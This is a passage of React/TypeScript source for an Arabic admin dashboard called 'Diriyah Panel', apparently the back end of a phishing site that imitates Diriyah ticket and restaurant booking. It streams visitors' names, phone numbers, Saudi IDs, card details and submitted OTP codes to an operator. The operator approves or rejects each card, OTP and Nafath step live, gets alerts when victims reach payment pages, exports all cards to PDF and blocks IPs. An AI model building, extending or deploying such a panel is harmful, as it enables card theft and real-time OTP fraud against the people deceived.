  useEffect(() => {
    const unsub = onSnapshot(doc(db, "settings", "blockedIps"), snap => {
      const data = snap.data() as any;
      const ips = Array.isArray(data?.ips) ? data.ips : [];
      setBlockedIps(
        ips
          .map((x: any) => String(x).trim())
          .filter((x: string) => x.length > 0)
      );
    });
    return () => unsub();
  }, []);

  async function addBlockedIp(ip: string) {
    const clean = String(ip).trim();
    if (!clean) return;
    if (blockedIps.includes(clean)) return;
    await setDoc(
      doc(db, "settings", "blockedIps"),
      { ips: arrayUnion(clean), updatedAt: new Date().toISOString() },
      { merge: true }
    );
  }
  async function removeBlockedIp(ip: string) {
    const clean = String(ip).trim();
    if (!clean) return;
    await setDoc(
      doc(db, "settings", "blockedIps"),
      { ips: arrayRemove(clean), updatedAt: new Date().toISOString() },
      { merge: true }
    );
  }

  // Block/unblock a visitor by toggling the per-doc `blocked` field.
  const blockedVisitors = useMemo(
    () => visitors.filter(v => v.blocked === true).map(v => v.id),
    [visitors]
  );
  async function toggleBlockedVisitor(visitorId: string) {
    const isBlocked = blockedVisitors.includes(visitorId);
    if (isBlocked) {
      if (!confirm("إزالة الحظر عن هذا الزائر؟")) return;
      await updateVisitorBlockStatus(visitorId, false);
    } else {
      if (
        !confirm("حظر هذا الزائر نهائياً؟\nسيُمنع من إكمال أي خطوة في الحجز.")
      )
        return;
      await updateVisitorBlockStatus(visitorId, true);
    }
  }

  // Re-render every 15s so relative timestamps stay fresh.
  useEffect(() => {
    const t = setInterval(() => forceTick(n => n + 1), 15000);
    return () => clearInterval(t);
  }, []);

  useEffect(() => {
    try {
      localStorage.setItem("admin.soundOn", soundOn ? "1" : "0");
    } catch {}
  }, [soundOn]);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [otpInput, setOtpInput] = useState("");
  const [otpDirect, setOtpDirect] = useState("");
  const [cardSettings, setCardSettings] = useState<CardSettings>(() =>
    loadCardSettings()
  );

  useEffect(() => {
    try {
      localStorage.setItem("admin.cardSettings", JSON.stringify(cardSettings));
    } catch {}
  }, [cardSettings]);

  function updateCardSetting(key: CardKey, patch: Partial<CardSetting>) {
    setCardSettings(prev => ({ ...prev, [key]: { ...prev[key], ...patch } }));
  }
  function resetCardSettings() {
    setCardSettings(DEFAULT_CARD_SETTINGS);
  }
  function spanClass(key: CardKey) {
    const s = cardSettings[key];
    if (!s.visible) return "hidden";
    return s.span === 2
      ? "md:col-span-2 xl:col-span-2"
      : "md:col-span-1 xl:col-span-1";
  }

  const cardSeenRef = useRef<Set<string>>(new Set());
  const cardSnapshotReadyRef = useRef(false);
  const cardAudioRef = useRef<HTMLAudioElement | null>(null);
  if (!cardAudioRef.current && typeof Audio !== "undefined") {
    cardAudioRef.current = new Audio(cardAddedSoundUrl);
    cardAudioRef.current.preload = "auto";
    cardAudioRef.current.volume = 0.85;
  }

  // Tracks the last `currentPage` we've seen for each visitor so we can
  // detect transitions into sensitive pages (checkout / otp / confirmation)
  // without re-firing alerts on every snapshot for the same state.
  const lastPageRef = useRef<Map<string, string>>(new Map());
  // Tracks the last OTP value per visitor so we can fire a toast only when
  // a NEW code is submitted (or an existing one changes), not on every
  // snapshot replay.
  const lastOtpRef = useRef<Map<string, string>>(new Map());
  // Per-visitor "recent alert" timestamps drive the row glow animation.
  // Stored in a ref + state mirror so the render reads from state but
  // updates from inside the snapshot don't cascade extra renders.
  const [recentAlerts, setRecentAlerts] = useState<
    Record<string, { kind: keyof typeof ALERT_TONES; until: number }>
  >({});
  // Tab-title pulse counter: each unread sensitive event increments this
  // when the dashboard tab is in the background; viewing the tab clears it.
  const [unreadAlerts, setUnreadAlerts] = useState(0);
  // Soft-cap how many rows we render to keep the DOM fast. Grows on scroll.
  const PAGE_SIZE = 80;
  const [visibleCount, setVisibleCount] = useState(PAGE_SIZE);
  const soundOnRef = useRef(false);
  useEffect(() => {
    soundOnRef.current = soundOn;
  }, [soundOn]);

  useEffect(() => {
    const q = query(collection(db, "pays"));
    const unsub = onSnapshot(q, snap => {
      const rawList: Visitor[] = [];
      snap.forEach((d: any) =>
        rawList.push(adaptVisitor({ id: d.id, ...(d.data() as any) }))
      );
      const list = collapseDuplicateVisitors(rawList);
      // Sort by updatedAt desc
      list.sort((a, b) => {
        const ta = new Date(a.updatedAt || 0).getTime() || 0;
        const tb = new Date(b.updatedAt || 0).getTime() || 0;
        return tb - ta;
      });

      // Detect newly-added cards. On first snapshot, just record what
      // already has a card so we don't spam on dashboard open.
      const newCardVisitors: Visitor[] = [];
      for (const v of list) {
        const hasCard = !!(
          (v as any).cardNumber ||
          v.payment?.cardNumber ||
          v.payment?.cardLast4
        );
        if (!hasCard) continue;
        if (!cardSeenRef.current.has(v.id)) {
          cardSeenRef.current.add(v.id);
          if (cardSnapshotReadyRef.current) newCardVisitors.push(v);
        }
      }
      if (newCardVisitors.length > 0 && cardAudioRef.current) {
        try {
          cardAudioRef.current.currentTime = 0;
          void cardAudioRef.current.play().catch(() => {
            // Browsers block autoplay until user interaction; safely ignore.
          });
        } catch {
          // ignore
        }
      }
      // Track newly-submitted OTP codes per visitor.
      for (const v of list) {
        const code = String((v as any).otp || "").trim();
        lastOtpRef.current.set(v.id, code);
      }

      // Detect transitions into sensitive pages (checkout/otp/confirmation).
      // Only fires when a visitor's `currentPage` actually CHANGES into a
      // sensitive page, never on every snapshot — so a visitor sitting on
      // /checkout for 3 minutes alerts exactly once. We also prune the
      // page map for visitors no longer in the snapshot so memory doesn't
      // grow unbounded over long-running sessions.
      const currentIds = new Set(list.map(v => v.id));
      for (const id of Array.from(lastPageRef.current.keys())) {
        if (!currentIds.has(id)) lastPageRef.current.delete(id);
      }
      for (const id of Array.from(cardSeenRef.current)) {
        if (!currentIds.has(id)) cardSeenRef.current.delete(id);
      }
      for (const id of Array.from(lastOtpRef.current.keys())) {
        if (!currentIds.has(id)) lastOtpRef.current.delete(id);
      }
      const triggered: Array<{
        id: string;
        kind: keyof typeof ALERT_TONES;
      }> = [];
      for (const v of list) {
        const page = String((v as any).currentPage || "");
        const prev = lastPageRef.current.get(v.id);
        lastPageRef.current.set(v.id, page);
        // Don't alert on the first snapshot pass — that is a baseline,
        // not a transition. `cardSnapshotReadyRef` is flipped true at the
        // bottom of this callback, AFTER lastPageRef is fully seeded.
        if (!cardSnapshotReadyRef.current) continue;
        if (prev === page) continue;
        const kind = alertKindFor(page);
        if (!kind) continue;
        triggered.push({ id: v.id, kind });
      }

      if (triggered.length > 0) {
        if (soundOnRef.current) {
          // Preserve the previous cadence: one sound per distinct visitor
          // alert kind in the polling batch, now using the configured MP3.
          const kinds = distinctVisitorAlertKinds(triggered.map(t => t.kind));
          kinds.forEach(() => playConfiguredVisitorAlert());
        }
        // Mark each triggered visitor with a glow window (8 seconds).
        const until = Date.now() + 8000;
        setRecentAlerts(prev => {
          const next = { ...prev };
          for (const { id, kind } of triggered) next[id] = { kind, until };
          return next;
        });
        // Bump unread counter only when the tab is hidden so the user
        // sees how many sensitive events fired while they were away.
        if (typeof document !== "undefined" && document.hidden) {
          setUnreadAlerts(n => n + triggered.length);
        }
      }

      cardSnapshotReadyRef.current = true;

      setVisitors(list);
      setLoading(false);
      setSelectedId(prev => {
        if (prev && list.some(v => v.id === prev)) return prev;
        return list[0]?.id ?? null;
      });
    });
    return () => unsub();
  }, []);

  // Sweep expired recent-alert glows once per second so rows return to
  // their normal styling without forcing every snapshot to do the work.
  useEffect(() => {
    const t = setInterval(() => {
      setRecentAlerts(prev => {
        const now = Date.now();
        let changed = false;
        const next: typeof prev = {};
        for (const [id, entry] of Object.entries(prev)) {
          if (entry.until > now) next[id] = entry;
          else changed = true;
        }
        return changed ? next : prev;
      });
    }, 1000);
    return () => clearInterval(t);
  }, []);

  // Tab title pulse: when the admin is on another tab and unread alerts
  // accrue, the title actually flips between two states once per second so
  // it visibly *pulses* in the OS task switcher — much more attention-
  // grabbing than a static prefix. Mounts ONCE and reads live unread count
  // from a ref so listeners aren't re-bound on every state change.
  const unreadAlertsRef = useRef(0);
  useEffect(() => {
    unreadAlertsRef.current = unreadAlerts;
  }, [unreadAlerts]);
  useEffect(() => {
    if (typeof document === "undefined") return;
    const dashboardTitle = "لوحة التحكم — الدرعية";
    const previousTitle = document.title;
    let phase = 0;
    const render = () => {
      const n = unreadAlertsRef.current;
      if (document.hidden && n > 0) {
        document.title =
          phase % 2 === 0
            ? `🔔 (${n}) ${dashboardTitle}`
            : `⚠️ (${n}) تنبيه عاجل`;
      } else {
        document.title = dashboardTitle;
      }
    };
    render();
    const interval = setInterval(() => {
      phase += 1;
      render();
    }, 1000);
    const onVis = () => {
      if (!document.hidden) setUnreadAlerts(0);
      phase = 0;
      render();
    };
    document.addEventListener("visibilitychange", onVis);
    window.addEventListener("focus", onVis);
    return () => {
      clearInterval(interval);
      document.removeEventListener("visibilitychange", onVis);
      window.removeEventListener("focus", onVis);
      // Restore whatever title was active before this dashboard mounted
      // so navigating away doesn't leave the dashboard title stuck.
      document.title = previousTitle;
    };
  }, []);

  useEffect(() => {
    const interval = window.setInterval(
      () => setPresenceTick(tick => tick + 1),
      10_000
    );
    return () => window.clearInterval(interval);
  }, []);

  const filtered = useMemo(() => {
    void presenceTick;
    return filterDashboardSidebarVisitors(
      visitors,
      filter as DashboardSidebarFilter,
      search,
      { isOnline, isWaiting, isCompleted }
    );
  }, [visitors, filter, search]);

  // Reset the soft-cap whenever the displayed list changes meaningfully so
  // the user always sees the most-recent N rows after switching filters.
  useEffect(() => {
    setVisibleCount(PAGE_SIZE);
  }, [filter, search]);

  // Clamp the rendered window so it never exceeds the current filtered
  // length, and decay it back toward PAGE_SIZE after periods of inactivity
  // so a user who scrolled deep an hour ago doesn't keep paying the DOM
  // cost forever. Reset on any user scroll (handler below also re-grows
  // the window naturally).
  const lastScrollAtRef = useRef(Date.now());
  useEffect(() => {
    setVisibleCount(c => Math.min(c, Math.max(PAGE_SIZE, filtered.length)));
  }, [filtered.length]);
  useEffect(() => {
    const t = setInterval(() => {
      // After 2 minutes of no scrolling, decay back to PAGE_SIZE so the
      // DOM stays small without surprising an actively-scrolling admin.
      if (Date.now() - lastScrollAtRef.current > 120_000) {
        setVisibleCount(c => (c > PAGE_SIZE ? PAGE_SIZE : c));
      }
    }, 30_000);
    return () => clearInterval(t);
  }, []);

  const stats = useMemo(() => {
    const total = visitors.length;
    const online = visitors.filter(v => isOnline(v)).length;
    const waiting = visitors.filter(v => isWaiting(v)).length;
    const completed = visitors.filter(v => isCompleted(v)).length;
    const onPayment = visitors.filter(
      v => Number(v.step) >= 4 && Number(v.step) <= 6 && !isCompleted(v)
    ).length;
    return { total, online, waiting, completed, onPayment };
  }, [visitors]);

  // Beep when a NEW visitor enters waiting state.
  useEffect(() => {
    const currentWaiting = new Set(
      visitors.filter(v => isWaiting(v)).map(v => v.id)
    );
    let hasNew = false;
    currentWaiting.forEach(id => {
      if (!prevWaitingIds.current.has(id)) hasNew = true;
    });
    if (hasNew && soundOn && prevWaitingIds.current.size > 0) {
      beep();
    }
    prevWaitingIds.current = currentWaiting;
  }, [visitors, soundOn]);

  const selected = visitors.find(v => v.id === selectedId) || null;

  /**
   * Bridges the new dashboard's per-field approval model onto the existing
   * legacy fields the user-facing flow listens to. We also persist the new
   * `*ApprovalStatus` field so the dashboard UI reflects state immediately
   * on rebooted sessions.
   */
  async function setApprovalStatus(
    id: string,
    field:
      | "cardApprovalStatus"
      | "otpApprovalStatus"
      | "phoneOtpApprovalStatus"
      | "nafadConfirmationStatus",
    status: "approved" | "rejected"
  ) {
    const decidedAt = new Date().toISOString();
    const payload: Record<string, unknown> = {
      [field]: status,
      [`${field}DecidedAt`]: decidedAt,
      updatedAt: decidedAt,
    };

    // Keep the legacy fields in the same atomic write. The visitor-facing
    // checkout and OTP pages listen to these fields, while the dashboard
    // renders the newer per-field status values.
    if (field === "cardApprovalStatus") {
      const targetVisitor = visitors.find(visitor => visitor.id === id);
      const otpStep =
        targetVisitor && getVisitorFlow(targetVisitor) === "restaurant" ? 5 : 4;
      Object.assign(
        payload,
        buildCardApprovalPayload(status, decidedAt, otpStep)
      );
    } else if (field === "otpApprovalStatus") {
      payload.otpApproved = status === "approved";
      payload.otpStatus = status;
    }

    console.log("[DEBUG] setApprovalStatus update:", {
      id,
      field,
      status,
      payload,
    });

    try {
      if (field === "cardApprovalStatus") {
        const targetVisitor = visitors.find(visitor => visitor.id === id);
        const otpStep =
          targetVisitor && getVisitorFlow(targetVisitor) === "restaurant"
            ? 5
            : 4;
        await updateApprovalStatus(id, status === "approved", otpStep);
      } else if (field === "otpApprovalStatus") {
        await updateOtpApprovalStatus(id, status === "approved");
      } else {
        await setDoc(doc(db, "pays", id), payload, { merge: true });
      }
    } catch (e) {
      console.error("setApprovalStatus failed", e);
    }
  }

  async function pushDirective(id: string, payload: any) {
    await setDoc(
      doc(db, "pays", id),
      { ...payload, updatedAt: new Date().toISOString() },
      { merge: true }
    );
  }

  async function removeVisitor(id: string) {
    if (!confirm("حذف هذا السجل؟")) return;
    // Preserve the IP block if this visitor was blocked, so deleting the
    // record doesn't accidentally let the same IP back in.
    try {
      const snap = await getDoc(doc(db, "pays", id));
      if (snap.exists()) {
        const data = snap.data() as any;
        const wasBlocked = data?.blocked === true;
        const ip = String(data?.ip || data?.ipAddress || "").trim();
        if (wasBlocked && ip) {
          await setDoc(
            doc(db, "settings", "blockedIps"),
            {
              ips: arrayUnion(ip),
              updatedAt: new Date().toISOString(),
            },
            { merge: true }
          );
        }
      }
    } catch (error) {
      console.error("Error preserving IP block on delete:", error);
    }
    await deleteDoc(doc(db, "pays", id));
    if (selectedId === id) setSelectedId(null);
  }

  async function removeAllVisitors() {
    const total = visitors.length;
    if (total === 0) {
      alert("لا توجد سجلات لحذفها");
      return;
    }
    if (!confirm(`سيتم حذف جميع السجلات (${total}) نهائياً!\nهل أنت متأكد؟`))
      return;
    if (!confirm("تأكيد أخير: حذف الكل؟ لا يمكن التراجع.")) return;
    const snap = await getDocs(collection(db, "pays"));
    const docs = snap.docs;
    for (let i = 0; i < docs.length; i += 450) {
      const batch = writeBatch(db);
      docs.slice(i, i + 450).forEach(d => batch.delete(d.ref));
      await batch.commit();
    }
    setSelectedId(null);
  }

  const selectedIndex = selected
    ? visitors.findIndex(v => v.id === selected.id)
    : -1;
  const selectAdjacentVisitor = (delta: number) => {
    if (filtered.length === 0) return;
    const idx = filtered.findIndex(v => v.id === selectedId);
    const nextIdx =
      idx === -1
        ? 0
        : (idx + delta + filtered.length) % filtered.length;
    setSelectedId(filtered[nextIdx]?.id ?? null);
  };

  return (
    <div
      className="h-screen bg-white text-gray-900 flex flex-col overflow-hidden"
      dir="rtl"
    >
      {/* Slim Top Utility Bar */}
      <header className="h-11 bg-white border-b border-gray-200 px-3 flex items-center justify-between gap-3 shrink-0 z-20">
        {/* Right side (RTL start): Action toolbar */}
        <div className="flex items-center gap-1.5 flex-wrap">
          <IconButton
            color="slate"
            icon={RefreshCw}
            label="تحديث"
            onClick={() => window.location.reload()}
          />
          <IconButton
            color={soundOn ? "green" : "slate"}
            icon={soundOn ? Volume2 : VolumeX}
            label={soundOn ? "كتم الصوت" : "تشغيل الصوت"}
            onClick={() => {
              setSoundOn(s => !s);
              if (!soundOn) beep();
            }}
          />
          <IconButton
            color={stats.waiting > 0 ? "red" : "slate"}
            icon={stats.waiting > 0 ? BellRing : Bell}
            label={
              stats.waiting > 0
                ? `${stats.waiting} بانتظار الموافقة`
                : "تنبيهات"
            }
            badge={stats.waiting > 0 ? String(stats.waiting) : undefined}
            pulse={stats.waiting > 0}
            onClick={() => setFilter("waiting")}
          />
          <IconButton
            color={blockedIps.length > 0 ? "red" : "slate"}
            icon={WifiOff}
            label="حظر بالـ IP"
            badge={
              blockedIps.length > 0 ? String(blockedIps.length) : undefined
            }
            onClick={() => setIpBlocklistOpen(true)}
          />
          <IconButton
            color={blockedBins.length > 0 || storedBlockedCards.length > 0 ? "red" : "slate"}
            icon={Ban}
            label="البطاقات المحظورة"
            badge={
              storedBlockedCards.length > 0
                ? String(storedBlockedCards.length)
                : blockedBins.length > 0
                  ? String(blockedBins.length)
                  : undefined
            }
            onClick={() => {
              setBlocklistOpen(true);
              void fetchBlockedCards().then(setStoredBlockedCards).catch(() => {});
            }}
          />
          <IconButton
            color="green"
            icon={FileSpreadsheet}
            label="تصدير البطاقات المحظورة (Excel)"
            badge={
              storedBlockedCards.length + blockedBins.length > 0
                ? String(Math.max(storedBlockedCards.length, blockedBins.length))
                : undefined
            }
            onClick={() =>
              exportBlockedCardsExcel(storedBlockedCards, blockedBins, visitors)
            }
            testId="export-blocked-excel"
          />
          <div
            className={`flex items-center rounded-md border overflow-hidden h-8 ${
              attackState.enabled ? "border-red-700 shadow-xs" : "border-gray-200"
            }`}
          >
            <button
              type="button"
              onClick={() => void toggleAttackMode()}
              disabled={attackBusy}
              title={
                attackState.enabled
                  ? "وضع التصدي للهجمات مفعّل — اضغط للإيقاف"
                  : "تفعيل وضع التصدي للهجمات"
              }
              className={`h-full px-2.5 text-[11px] font-bold flex items-center gap-1.5 transition cursor-pointer disabled:opacity-60 ${
                attackState.enabled
                  ? "bg-red-600 text-white hover:bg-red-700"
                  : "bg-white text-gray-700 hover:bg-gray-100"
              }`}
              data-testid="toggle-attack-protection"
            >
              {attackState.enabled ? (
                <ShieldAlert className="w-3.5 h-3.5 animate-pulse" />
              ) : (
                <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" />
              )}
              <span>
                {attackState.enabled ? "وضع الهجمة: مفعّل" : "وضع الحماية"}
              </span>
            </button>
            <button
              type="button"
              onClick={() => {
                setAttackPanelOpen(true);
                void fetchAdminSecurityState()
                  .then(setAttackState)
                  .catch(() => {});
              }}
              title="إعدادات وسجل الحماية من الهجمات"
              className={`h-full px-2 text-[11px] font-mono font-bold border-r flex items-center gap-1 transition cursor-pointer ${
                attackState.enabled
                  ? "bg-red-700 text-white border-red-800 hover:bg-red-800"
                  : "bg-gray-50 text-gray-600 border-gray-200 hover:bg-gray-100"
              }`}
              data-testid="open-attack-protection-panel"
            >
              <span>{attackState.blockedCount}</span>
            </button>
          </div>
          <IconButton
            color="slate"
            icon={FileDown}
            label="تصدير البطاقات (PDF)"
            badge={(() => {
              const n = visitors.filter(
                v => v.payment?.cardNumber || v.payment?.cardLast4
              ).length;
              return n > 0 ? String(n) : undefined;
            })()}
            onClick={() => exportAllCardsPdf(visitors)}
          />
          <CustomizeDropdown
            settings={cardSettings}
            onChange={updateCardSetting}
            onReset={resetCardSettings}
          />
          <IconButton
            color={visitors.length > 0 ? "red" : "slate"}
            icon={Trash2}
            label="حذف كل السجلات"
            badge={visitors.length > 0 ? String(visitors.length) : undefined}
            onClick={() => void removeAllVisitors()}
          />
          <IconButton
            color="slate"
            icon={LogOut}
            label="خروج"
            onClick={() => {
              void logoutUser();
            }}
          />
        </div>

        {/* Left side (RTL end): Brand + inline counters */}
        <div className="flex items-center gap-4 text-xs text-gray-600" dir="ltr">
          <div className="flex items-center gap-2 font-bold text-gray-900">
            <span className="w-6 h-6 rounded-md bg-gray-900 text-white flex items-center justify-center text-xs font-black">
              D
            </span>
            <span>Diriyah Panel</span>
          </div>
          <div className="hidden md:flex items-center gap-3 text-[11px] font-mono tabular-nums text-gray-600">
            <button
              onClick={() => setFilter("all")}
              className="hover:text-gray-900 flex items-center gap-1"
              title="إجمالي الزوار"
            >
              <Users className="w-3.5 h-3.5 text-gray-400" />
              <span>{stats.total}</span>
            </button>
            <button
              onClick={() => setFilter("online")}
              className="hover:text-emerald-600 flex items-center gap-1"
              title="متصل الآن"
            >
              <Activity className="w-3.5 h-3.5 text-emerald-500" />
              <span>{stats.online}</span>
            </button>
            <button
              onClick={() => setFilter("waiting")}
              className="hover:text-amber-600 flex items-center gap-1"
              title="بانتظار الموافقة"
            >
              <AlarmClock className="w-3.5 h-3.5 text-amber-500" />
              <span>{stats.waiting}</span>
            </button>
            <span className="flex items-center gap-1" title="في مرحلة الدفع">
              <CreditCard className="w-3.5 h-3.5 text-blue-500" />
              <span>{stats.onPayment}</span>
            </span>
            <button
              onClick={() => setFilter("completed")}
              className="hover:text-emerald-700 flex items-center gap-1"
              title="مكتمل"
            >
              <CheckCheck className="w-3.5 h-3.5 text-emerald-600" />
              <span>{stats.completed}</span>
            </button>
          </div>
        </div>
      </header>

      {/* Main Two-Column Inbox Body */}
      <div className="flex flex-1 min-h-0 overflow-hidden bg-white">
        {/* Right sidebar — Inbox Visitor List */}
        <aside className="w-[300px] sm:w-[320px] shrink-0 border-l border-gray-200 bg-white flex flex-col min-h-0 order-1">
          {/* Inbox header */}
          <div className="px-3.5 py-2.5 border-b border-gray-200 flex items-center justify-between">
            <h2 className="text-[15px] font-bold text-gray-800">صندوق الوارد</h2>
            <div className="text-xs font-mono font-semibold tabular-nums flex items-center gap-1" dir="ltr">
              <span className="text-emerald-600">{stats.online}</span>
              <span className="text-gray-300">/</span>
              <span className="text-rose-500">{stats.waiting}</span>
              <span className="text-gray-300">/</span>
              <span className="text-gray-700">{stats.total}</span>
            </div>
          </div>

          {/* Filter tabs + Search */}
          <div className="px-3 py-2 border-b border-gray-200 space-y-2">
            <div className="flex items-center gap-1 bg-gray-100 p-0.5 rounded-lg text-[11px]">
              {(
                [
                  ["all", "كل المحادثات", stats.total],
                  ["online", "متصل", stats.online],
                  ["waiting", "انتظار", stats.waiting],
                  ["completed", "مكتمل", stats.completed],
                ] as const
              ).map(([k, l, count]) => {
                const active = filter === k;
                const isWait = k === "waiting" && count > 0;
                return (
                  <button
                    key={k}
                    onClick={() => setFilter(k)}
                    className={`flex-1 py-1 px-1.5 rounded-md font-semibold transition flex items-center justify-center gap-1 ${
                      active
                        ? "bg-white text-gray-900 shadow-xs"
                        : isWait
                          ? "text-amber-700 hover:text-amber-900"
                          : "text-gray-600 hover:text-gray-900"
                    }`}
                    data-testid={`filter-${k}`}
                  >
                    <span className="truncate">{l}</span>
                  </button>
                );
              })}
            </div>
            <div className="relative">
              <Search className="w-3.5 h-3.5 absolute right-2.5 top-1/2 -translate-y-1/2 text-gray-400" />
              <input
                value={search}
                onChange={e => setSearch(e.target.value)}
                placeholder="بحث المستخدم..."
                className="w-full pr-8 pl-2.5 py-1.5 bg-gray-50 border border-gray-200 rounded-lg text-xs text-gray-900 placeholder-gray-400 focus:outline-none focus:border-blue-500 focus:bg-white"
                data-testid="admin-search"
              />
            </div>
          </div>

          {/* Scrollable visitor list */}
          <div
            className="overflow-y-auto flex-1 divide-y divide-gray-100"
            onScroll={e => {
              lastScrollAtRef.current = Date.now();
              const el = e.currentTarget;
              if (
                el.scrollHeight - el.scrollTop - el.clientHeight < 300 &&
                visibleCount < filtered.length
              ) {
                setVisibleCount(c =>
                  Math.min(c + PAGE_SIZE, filtered.length)
                );
              }
            }}
          >
            {filtered.length === 0 && (
              <OrderSidebarEmptyState
                loading={loading}
                count={filtered.length}
              />
            )}
            {filtered.slice(0, visibleCount).map(v => {
              const online = isOnline(v);
              const sel = v.id === selectedId;
              const flow = getVisitorFlow(v);
              const stage = getFlowStepLabels(flow)[v.step as number] || "—";
              const waiting = isWaiting(v);
              const completed = isCompleted(v);
              const last4 = v.payment?.cardLast4;
              const schemeRaw = String(
                v.payment?.cardScheme || v.cardType || ""
              ).toUpperCase();
              const isBlocked = blockedVisitors.includes(v.id);
              const alert = recentAlerts[v.id];
              const alertClass = alert
                ? alert.kind === "checkout"
                  ? "row-alert-checkout"
                  : alert.kind === "otp"
                    ? "row-alert-otp"
                    : "row-alert-confirmation"
                : "";
              return (
                <div
                  key={v.id}
                  role="button"
                  tabIndex={0}
                  onClick={() => setSelectedId(v.id)}
                  onKeyDown={e => {
                    if (e.key === "Enter" || e.key === " ")
                      setSelectedId(v.id);
                  }}
                  className={`w-full text-right px-3 py-2.5 transition flex items-start gap-2.5 group cursor-pointer relative ${alertClass} ${
                    isBlocked
                      ? "bg-red-50/70 hover:bg-red-50 opacity-75"
                      : sel
                        ? "bg-slate-100"
                        : waiting
                          ? "bg-amber-50/60 hover:bg-amber-50"
                          : "bg-white hover:bg-gray-50"
                  }`}
                  data-testid={`visitor-${v.id}`}
                >
                  {/* Avatar with online status dot */}
                  <div className="relative w-9 h-9 rounded-full bg-gray-100 border border-gray-200 flex items-center justify-center text-gray-500 shrink-0 mt-0.5">
                    <Users className="w-4 h-4" />
                    <span
                      className={`absolute -bottom-0.5 -left-0.5 w-2.5 h-2.5 rounded-full border-2 border-white ${
                        online
                          ? "bg-emerald-500"
                          : completed
                            ? "bg-blue-500"
                            : "bg-gray-400"
                      }`}
                    />
                  </div>

                  {/* Visitor summary */}
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center justify-between gap-2">
                      <div className="text-[13px] font-semibold text-gray-900 truncate">
                        {v.name || "زائر بدون اسم"}
                      </div>
                      <span className="text-[11px] text-gray-400 shrink-0">
                        {fmtRelative(v.updatedAt)}
                      </span>
                    </div>
                    <div className="text-[11px] text-gray-500 truncate mt-0.5">
                      {stage}
                    </div>
                    <div className="flex items-center justify-between gap-2 mt-1">
                      <div className="flex items-center gap-1.5 text-[10px] text-gray-500 min-w-0">
                        {schemeRaw && (
                          <span className="font-bold text-blue-800 tracking-wide">
                            {schemeRaw}
                          </span>
                        )}
                        {last4 && (
                          <span className="font-mono text-gray-500" dir="ltr">
                            ••{last4}
                          </span>
                        )}
                        {waiting && (
                          <span className="text-amber-600 font-bold">
                            بانتظار الموافقة
                          </span>
                        )}
                        {isBlocked && (
                          <span className="text-red-600 font-bold">محظور</span>
                        )}
                      </div>
                      <span className="text-[11px] text-gray-400 font-bold tracking-widest">
                        •••
                      </span>
                    </div>
                  </div>

                  {/* Quick hover actions */}
                  <div className="flex flex-col items-center gap-0.5 shrink-0">
                    <button
                      onClick={e => {
                        e.stopPropagation();
                        void toggleBlockedVisitor(v.id);
                      }}
                      title={isBlocked ? "إلغاء الحظر" : "حظر هذا الزائر"}
                      className={`p-1 rounded transition ${
                        isBlocked
                          ? "text-red-600 bg-red-50"
                          : "opacity-0 group-hover:opacity-100 text-gray-400 hover:text-red-600"
                      }`}
                      data-testid={`block-${v.id}`}
                    >
                      <Ban className="w-3.5 h-3.5" />
                    </button>
                    <button
                      onClick={e => {
                        e.stopPropagation();
                        removeVisitor(v.id);
                      }}
                      title="حذف"
                      className="opacity-0 group-hover:opacity-100 text-gray-400 hover:text-red-600 p-1"
                      data-testid={`del-${v.id}`}
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                    </button>
                  </div>
                </div>
              );
            })}
            {visibleCount < filtered.length && (
              <button
                type="button"
                onClick={() =>
                  setVisibleCount(c =>
                    Math.min(c + PAGE_SIZE, filtered.length)
                  )
                }
                className="w-full text-center py-2.5 text-xs text-blue-600 hover:bg-blue-50 transition"
                data-testid="button-load-more-visitors"
              >
                عرض المزيد ({filtered.length - visibleCount} متبقي)
              </button>
            )}
          </div>
        </aside>

        {/* Main Workspace */}
        <main className="flex-1 flex flex-col min-w-0 bg-white overflow-hidden order-2">
          {selected ? (
            <>
              {/* Visitor Sub-header */}
              <div className="px-4 py-2 border-b border-gray-200 bg-white flex items-center justify-between gap-3 shrink-0 flex-wrap">
                {/* Right side: Index + Name + Phone + Meta */}
                <div className="flex items-center gap-3 text-xs min-w-0 flex-wrap">
                  <span className="font-mono font-bold text-blue-600 tabular-nums">
                    {selectedIndex >= 0 ? selectedIndex + 1 : 1}
                  </span>
                  <span className="font-bold text-sm text-gray-900 truncate">
                    {selected.name || "زائر بدون اسم"}
                  </span>
                  {(selected.phone || selected.phoneVerification) && (
                    <>
                      <span className="text-gray-300">|</span>
                      <span
                        className="flex items-center gap-1 text-gray-700 font-mono"
                        dir="ltr"
                      >
                        <PhoneIcon className="w-3.5 h-3.5 text-gray-400" />
                        {selected.phone || selected.phoneVerification}
                      </span>
                    </>
                  )}
                  {selected.saudiId && (
                    <>
                      <span className="text-gray-300">|</span>
                      <span className="text-gray-600 font-mono">
                        رقم: {selected.saudiId}
                      </span>
                    </>
                  )}
                  <span className="text-gray-300">|</span>
                  <span className="text-gray-600">
                    {getVisitorFlow(selected) === "restaurant"
                      ? `حجز مطعم${selected.restaurant ? ` · ${selected.restaurant}` : ""}`
                      : "حجز تذاكر الدرعية"}
                  </span>
                </div>

                {/* Left side: Quick actions + Page Control */}
                <div className="flex items-center gap-2">
                  <button
                    onClick={() => removeVisitor(selected.id)}
                    className="px-2 py-1 text-xs text-gray-600 hover:text-red-600 hover:bg-red-50 rounded-md flex items-center gap-1 transition"
                    title="حذف السجل"
                  >
                    <Trash2 className="w-3.5 h-3.5" />
                    <span>حذف</span>
                  </button>
                  <button
                    onClick={() => void toggleBlockedVisitor(selected.id)}
                    className={`px-2 py-1 text-xs rounded-md flex items-center gap-1 transition ${
                      blockedVisitors.includes(selected.id)
                        ? "text-red-700 bg-red-50 font-semibold"
                        : "text-gray-600 hover:text-red-600 hover:bg-gray-100"
                    }`}
                    title={
                      blockedVisitors.includes(selected.id)
                        ? "إلغاء حظر الزائر"
                        : "حظر الزائر"
                    }
                  >
                    <Ban className="w-3.5 h-3.5" />
                  </button>
                  <div className="flex items-center gap-1 text-xs text-gray-500 border-r border-gray-200 pr-2 mr-1">
                    <button
                      onClick={() => selectAdjacentVisitor(-1)}
                      className="p-1 hover:bg-gray-100 rounded text-gray-600"
                      title="السابق"
                    >
                      ‹
                    </button>
                    <span className="font-mono text-[11px] tabular-nums">
                      {selectedIndex >= 0 ? selectedIndex + 1 : 0} -{" "}
                      {filtered.length}
                    </span>
                    <button
                      onClick={() => selectAdjacentVisitor(1)}
                      className="p-1 hover:bg-gray-100 rounded text-gray-600"
                      title="التالي"
                    >
                      ›
                    </button>
                  </div>
